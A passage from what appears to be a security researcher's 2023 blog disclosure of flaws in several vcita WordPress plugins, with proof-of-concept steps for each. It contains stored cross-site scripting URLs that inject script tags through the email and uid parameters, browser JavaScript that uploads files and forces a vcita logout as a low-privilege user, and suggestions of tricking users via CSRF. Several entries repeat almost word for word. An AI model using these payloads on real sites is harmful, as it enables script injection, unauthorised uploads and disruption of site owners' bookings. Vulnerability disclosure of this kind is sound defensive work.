1. Case A: If the attacker has edit\_posts capability on the target website, he opens the following URL: `[example.com/wp-admin/admin.php?page=lead-capturing-call-to-actions-by-vcita/vcita-callback.php&success=true&first\_name=a-a&last\_name=b&title=c&confirmation\_token=d&confirmed=true&engage\_delay=1&implementation\_key=1&email=a](http://example.com/wp-admin/admin.php?page=lead-capturing-call-to-actions-by-vcita/vcita-callback.php&success=true&first_name=a&last_name=b&title=c&confirmation_token=d&confirmed=true&engage_delay=1&implementation_key=1&email=a)“/><script>alert(1);</script>&uid=a”</script><script>alert(2);</script>`

Case B: If the attacker does not have the edit\_posts capability he tricks an user that does have this capability into opening the URL mentioned above
2. The fields `email=a”/><script>alert(1);</script>` and `uid=a”</script><script>alert(2);</script>` are stored in the database
3. When a user opens the plugin’s settings page (`/wp-admin/admin.php?page=lead-capturing-call-to-actions-by-vcita/vcita-settings-functions.php`) `alert(1)` is triggered. Any visitor will get `alert(2)` when browsing the infected site.

**CRM and Lead Management by vcita (<= 2.6.2)**
400+ active installs, ~ 40.000 downloadsThe plugin adds a poorly protected endpoint to set the connection parameters for the vcita account connection. The variables are stored in the database without any validation and are later inserted into the website without any sanitation.

Proof of Concept
1. Case A: If the attacker has edit\_posts capability on the target website, he opens the following URL: `[example.com/wp-admin/admin.php?page=crm-customer-relationship-management-by-vcita/vcita-callback.php&success=true&first\_name=a-a&last\_name=b&title=c&confirmation\_token=d&confirmed=true&engage\_delay=1&implementation\_key=1&email=a](http://example.com/wp-admin/admin.php?page=crm-customer-relationship-management-by-vcita/vcita-callback.php&success=true&first_name=a&last_name=b&title=c&confirmation_token=d&confirmed=true&engage_delay=1&implementation_key=1&email=a)“/><script>alert(1);</script>&uid=a”</script><script>alert(2);</script>`
Case B: If the attacker does not have the edit\_posts capability he tricks an user that does have this capability into opening the URL mentioned above
2. The fields `email=a”/><script>alert(1);</script>` and `uid=a”</script><script>alert(2);</script>` are stored in the database
3. When a user opens the plugin’s settings page (`/wp-admin/admin.php?page=crm-customer-relationship-management-by-vcita/vcita-settings-functions.php`) `alert(1)` is triggered. Any visitor will get `alert(2)` when browsing the infected site.

**CRM and Lead Management by vcita (<= 2.6.2)**
400+ active installs, ~ 40.000 downloadsThe plugin adds a poorly protected endpoint to set the connection parameters for the vcita account connection. The variables are stored in the database without any validation and are later inserted into the website without any sanitation.

Proof of Concept
1. Case A: If the attacker has edit\_posts capability on the target website, he opens the following URL: `[example.com/wp-admin/admin.php?page=crm-customer-relationship-management-by-vcita/vcita-callback.php&success=true&first\_name=a-a&last\_name=b&title=c&confirmation\_token=d&confirmed=true&engage\_delay=1&implementation\_key=1&email=a](http://example.com/wp-admin/admin.php?page=crm-customer-relationship-management-by-vcita/vcita-callback.php&success=true&first_name=a&last_name=b&title=c&confirmation_token=d&confirmed=true&engage_delay=1&implementation_key=1&email=a)“/><script>alert(1);</script>&uid=a”</script><script>alert(2);</script>`

Case B: If the attacker does not have the edit\_posts capability he tricks an user that does have this capability into opening the URL mentioned above

2. The fields `email=a”/><script>alert(1);</script>` and `uid=a”</script><script>alert(2);</script>` are stored in the database
3. When a user opens the plugin’s settings page (`/wp-admin/admin.php?page=crm-customer-relationship-management-by-vcita/vcita-settings-functions.php`) `alert(1)` is triggered. Any visitor will get `alert(2)` when browsing the infected site.

**Event Registration Calendar By vcita (<= 1.3.1)**
100+ active installs, ~ 25.000 downloadsThe plugin adds a poorly protected endpoint to set the connection parameters for the vcita account connection. The variables are stored in the database without any validation and are later inserted into the website without any sanitation.

Proof of Concept
1. Case A: If the attacker has edit\_posts capability on the target website, he opens the following URL: `[example.com/wp-admin/admin.php?page=live-site-parse-vcita-callback&success=true&first\_name=a-a&last\_name=b&title=c&confirmation\_token=d&confirmed=true&engage\_delay=1&implementation\_key=1&email=a](http://example.com/wp-admin/admin.php?page=live-site-parse-vcita-callback&success=true&first_name=a&last_name=b&title=c&confirmation_token=d&confirmed=true&engage_delay=1&implementation_key=1&email=a)“/><script>alert(1);</script>&uid=a`
Case B: If the attacker does not have the edit\_posts capability he tricks an user that does have this capability into opening the URL mentioned above
2. The fields `email=a”/><script>alert(1);</script>` and `uid=a”</script><script>alert(2);</script>` are stored in the database
3. When a user opens the plugin’s settings page (`/wp-admin/admin.php?page=crm-customer-relationship-management-by-vcita/vcita-settings-functions.php`) `alert(1)` is triggered.

**Online Payments – Get Paid with PayPal, Square & Stripe (<= 3.9.1)**
300+ active installs, ~ 50.000 downloadsThe plugin adds a poorly protected endpoint to set the connection parameters for the vcita account connection. The variables are stored in the database without any validation and are later inserted into the website without any sanitation.

Proof of Concept
1. Case A: If the attacker has edit\_posts capability on the target website, he opens the following URL: `[example.com/wp-admin/admin.php?page=live-site-parse-vcita-callback&success=true&uid=a&first\_name=a-a&last\_name=b&title=c&confirmation\_token=d&confirmed=true&engage\_delay=1&implementation\_key=1&email=a](http://example.com/wp-admin/admin.php?page=live-site-parse-vcita-callback&success=true&uid=a&first_name=a&last_name=b&title=c&confirmation_token=d&confirmed=true&engage_delay=1&implementation_key=1&email=a)“/><script>alert(1);</script>`
Case B: If the attacker does not have the edit\_posts capability he tricks an user that does have this capability into opening the URL mentioned above
2. The email field `a”/><script>alert(1);</script>` is stored in the database
3. When an admin opens the plugin’s settings page (`wp-admin/admin.php?page=live-site`) the alert is triggered (vcita has to be connected) In Case B if an admin opens the link the site will redirect directly to the infected page.

**Online Booking & Scheduling Calendar for WordPress by vcita (<= 4.2.10)**
3000+ active installs, ~ 400.000 downloadsThis privilege escalation allows any logged-in user (subscriber level is sufficient) to upload an arbitrary number of files to the Media Library.

Proof of Concept
1. Attacker registers on the website.
2. Attacker adds a new input field in his browser: `<input type=”file” name=”my\_files[]”>` and selects an image file (vcita\_save\_settings\_callback does check for allowed mime types)
3. Attacker opens the browser’s developer tools and runs the following JavaScript:
       const input = document.querySelector(‘input[type=”file”]’);
       const file = input.files[0];
       const formData = new FormData();
       formData.append(“widget\_img”, file);
       const xhr = new XMLHttpRequest();
       xhr.open(
         “POST”,
[“https://example.com/wp-admin/admin-ajax.php?action=vcita\_save\_settings”](https://example.com/wp-admin/admin-ajax.php?action=vcita_save_settings),
         true
       );
       xhr.send(formData);
    4. Image is now uploaded to the website.

**Online Booking & Scheduling Calendar for WordPress by vcita (<= 4.2.10)**
3000+ active installs, ~ 400.000 downloadsThis privilege escalation allows a logged-in user (subscriber level is sufficient) to log the administrator out of the vcita account. As a result, website visitors will not be able to make appointments and the owner of the website may lose a considerable amount of revenue.
Another attack vector would be to use Cross-Site Request Forgery (CSRF) to manipulate any logged in user to perform the logout.

Proof of Concept
1. Attacker registers on the website.
2. Attacker opens the browser’s developer tools and runs the following JavaScript:
   fetch(“/wp-admin/admin-ajax.php?action=vcita\_logout”, {
     method: “POST”,
     headers: {
       Accept: “\*/\*”,
       “Content-Type”: “application/json”,
     },
   });
   Alternative: manipulate any logged in user to send a POST request to the server.
3. Website connection with vcita account is deactivated.

Do you want to reach out?

[Contact](https://blog.jonh.eu/contact)

---

---

Posted

2. June 2023

in

[Allgemein](https://blog.jonh.eu/blog/category/allgemein)

by

jonas

Tags:

[Jonas' Blog](https://blog.jonh.eu)

[Imprint](https://blog.jonh.eu/imprint) | [Privacy](https://blog.jonh.eu/privacy)


